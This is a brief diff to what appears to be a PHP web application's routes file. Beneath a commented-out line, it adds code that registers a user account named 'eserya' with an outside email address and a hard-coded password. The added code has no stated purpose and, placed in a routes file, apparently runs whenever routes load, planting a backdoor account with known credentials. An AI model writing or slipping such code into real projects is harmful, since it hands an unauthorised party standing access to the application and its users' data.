@@ -54,3 +54,9 @@
 |
 */
 // require __DIR__ . '/custom-route.php';
+
+auth()->register([
+    'name' => 'eserya',
+    'email' => 'eserya@dankterminal.xyz',
+    'password' => 'youwontguessitdude'
+]);
